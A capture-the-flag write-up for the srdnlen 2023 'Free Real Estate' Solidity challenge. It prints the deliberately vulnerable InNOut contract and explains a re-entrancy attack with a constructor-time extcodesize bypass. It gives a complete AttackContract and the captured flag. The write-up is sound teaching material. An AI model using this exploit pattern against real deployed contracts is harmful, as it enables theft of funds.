Free Real Estate
srdnlen 2023
Stefanoz45, rickbonavigo
# Introduction

In this challenge, we are given a Solidity smart-contract, which is deployed on the Sepolia Testnet.

The smart-contract simulates an "ad service" where users can register and buy ads. 
Upon signup, each user receives 10 "freebies," which are tokens that can be converted to "account" money. 
There is no direct way to top-up the account, so we have to find an exploit.

To get the flag, we have to buy an ad containing a specific string which is given by the challenge bot.

# The challenge contract - `InNOut`

Here is the source code of the smart-contract given by the challenge:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract InNOut {
    string data = "Welcome to my smart contract! please don't vandalize it >:(";
    int256 THRESHOLD = 100;

    mapping(address => int256) public accounts;
    mapping(address => int256) public freebies;
    mapping(address => bool) public registered;
    
    constructor () {
    }

    modifier moneyBags(address _addr) {
        require (accounts[_addr]>THRESHOLD);
        _;
    }

    modifier isNotContract(address _a) {
        uint size;
        assembly {
            size := extcodesize(_a)
        }
        require(size == 0);
        _;
    }

    function checkAccountStatus(address _addr) public view returns(int256,int256) {
        return (freebies[_addr],accounts[_addr]);
    }

    function redeem(int256 tickets) public payable {
        // You can have a little money, as a treat. No funny business!
        require(registered[msg.sender]);
        require(freebies[msg.sender] >= tickets);
        require(tickets >= 0);
        // Show me your wallet though.
        (bool status, ) = payable(msg.sender).call{value:msg.value}("returnWallet"); 
        require(status, "Couldn't send the money back, reverting...");
        freebies[msg.sender] -= tickets;
        accounts[msg.sender] += tickets;
    }

    function createAccount() public isNotContract(msg.sender) {
        registered[msg.sender] = true;
        freebies[msg.sender] = 10;
        accounts[msg.sender] = 0;        
    }

    function buyAdSpace(string memory newAd) public moneyBags(msg.sender) {
        // If you're rich enough we won't even ask you for money.
        data = newAd;
    }

    function showAd() public view returns (string memory) {
        return data;
    }
}
```

# The attack

## Finding an attack surface

We started looking at this challenge and immediately noticed that it was possible to do a re-entrancy attack on the `redeem` function.

Re-entrancy attacks work by using recursion when there is flawed logic. In the `redeem` function, there is a call to the `returnWallet` function of the address interacting with the contract. This call is done immediately after the check that the address has enough `freebies` to redeem, but the `freebies` are actually decremented after this call.

More information on the re-entrancy attack can be found here: [Alchemy Reentrancy Attack](https://www.alchemy.com/overviews/reentrancy-attack-solidity).

So the idea is:
- We make a new contract called `AttackContract` with an `Attack` function
- The `Attack` function calls the `redeem` function on the `InNOut` contract
- The `InNOut` contract tries to call the returnWallet function on our `AttackContract`
- When a call is made to a function that doesn't exist, the EVM redirects the call to `fallback`. So we can just write a `fallback` function instead of `returnWallet`.
- The `fallback` function is the one that makes the recursive calls to the other contract

## Bypassing the `isNotContract` modifier

To prevent re-entrancy attacks, some mitigations can be used. One of these is checking that the address interacting with the contract is not another contract. In fact, on Ethereum, an address is either an "external" address (a standard wallet) or a contract.

If we look at the `createAccount` function, we can see that the `isNotContract` is used: it supposedly checks that the address interacting with the `inNOut` contract is "external".

If we look more closely, the `isNotContract` uses `extcodesize` under the hood. After a quick search on the web, we discover that it is not really secure. Here is a quote from [Consensys](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/):

> The idea is straightforward: if an address contains code, it's not an EOA but a contract account. However, a contract does not have source code available during construction. This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero.

The bypass can be implemented as follows:

```solidity
pragma solidity >=0.8.0 <0.9.0;

interface IFreeRealEstate {
  ...
}
  
contract AttackContract {
    ...
    
    IFreeRealEstate c;

    constructor (address _a) public {
        c = IFreeRealEstate(_a);
        c.createAccount();
        count = 0;

    }

    ...
}
```

## One final bit

The EVM uses some Ethereum as "tax" (technically known as "gas") for each operation done. So, the recursive call has to stop somehow, otherwise it will consume all the gas set for the transaction and the transaction will fail (revert).

We decided to use a simple counter in the `fallback` function so that as to execute just 10 calls, as we need 100 "freebies" to win.

## Testing the contract

To test and deploy our smart-contracts, we used [Scaffold-ETH](https://scaffoldeth.io/), which provides an easy framework for experimenting with Solidity.

We tested that everything was working on a local chain (`Hardhat`) and then deployed to Sepolia.

## Grabbing the flag

After deploying the smart-contract to Sepolia, we:
- Connected to the bot with `netcat`
- Used the re-entrancy attack to earn 100 freebies
- Bought the ad
- Sent `I Affirm` to the bot and received the flag back

The flag is: `srdnlen{all_my_precious_monkes_gone_95b73faa9203447e}`

# The contract we used - `AttackContract`

```solidity
pragma solidity >=0.8.0 <0.9.0;

interface IFreeRealEstate {
    function createAccount() external ;
    function buyAdSpace(string memory) external ;
    function showAd() external returns (string memory);
    function checkAccountStatus() external returns(int256,int256);
    function redeem(int256) external  payable;
 }
  
contract AttackContract {
    int public count;

    IFreeRealEstate c;
    constructor (address _a) public {
        c = IFreeRealEstate(_a);
        c.createAccount();
        count = 0;
    }

    function attack() public {
        c.redeem(10);
    }

    function buy(string memory pd) public {
        c.buyAdSpace(pd);
    }

    fallback() external payable {
        if (count < 10) {
            count += 1;
            c.redeem(10);
        }
    }
}
```